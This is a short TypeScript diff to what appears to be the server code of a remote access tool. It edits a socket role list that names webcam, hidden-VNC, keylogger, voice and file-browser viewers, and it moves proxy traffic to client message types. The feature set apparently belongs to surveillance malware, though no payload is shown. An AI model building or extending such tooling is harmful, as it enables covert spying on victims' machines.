@@ -1,4 +1,4 @@
-export type SocketRole = "client" | "viewer" | "console_viewer" | "rd_viewer" | "webcam_viewer" | "hvnc_viewer" | "file_browser_viewer" | "process_viewer" | "keylogger_viewer" | "proxy_viewer" | "voice_viewer" | "notifications_viewer";
+export type SocketRole = "client" | "viewer" | "console_viewer" | "rd_viewer" | "webcam_viewer" | "hvnc_viewer" | "file_browser_viewer" | "process_viewer" | "keylogger_viewer" | "voice_viewer" | "notifications_viewer";
 
 const textEncoder = new TextEncoder();
 
@@ -28,6 +28,8 @@ export const ALLOWED_CLIENT_MESSAGE_TYPES = new Set([
   "voice_uplink",
   "webcam_devices",
   "hvnc_clone_progress",
+  "proxy_data",
+  "proxy_close",
 ]);
 
 export function isAllowedClientMessageType(type: string): boolean {
